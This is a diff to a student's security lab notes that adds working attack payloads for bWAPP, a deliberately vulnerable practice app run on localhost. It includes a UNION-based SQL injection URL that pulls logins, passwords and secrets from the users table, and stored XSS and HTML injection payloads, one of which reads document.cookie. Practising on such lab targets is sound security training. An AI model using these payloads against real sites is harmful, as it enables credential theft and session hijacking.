@@ -23,8 +23,24 @@ Another parts [part A](part2.md) [part B](part3.md)
  
  
  ## Show 3 working OWASP in bWAPP
- 
- 
+ 1. sqli_2.php
+ ```
+ localhost/bWAPP/sqli_2.php?movie=-1+union+select+1,login,password,secret,email,6,7+from+bWAPP.users+order%20by%204+desc+&action=go
+ ```
+ 2. xss_stored_1.php
+ ```
+ <script>alert(1);</script>
+ ```
+ 3. xss_stored_3.php
+   1. Find `input` in code inspector and change **type** from `hidden` to `text`
+   2. Enter any value to first `input` and enter your script to second `input`
+   ```
+   "><script>alert(1);</script>
+   ```
+ 4. htmli_get.php
+ ```
+ <script>alert(document.cookie);</script>
+ ```
  
  ## Hash: 1st indentify which hash, then break given hash
  
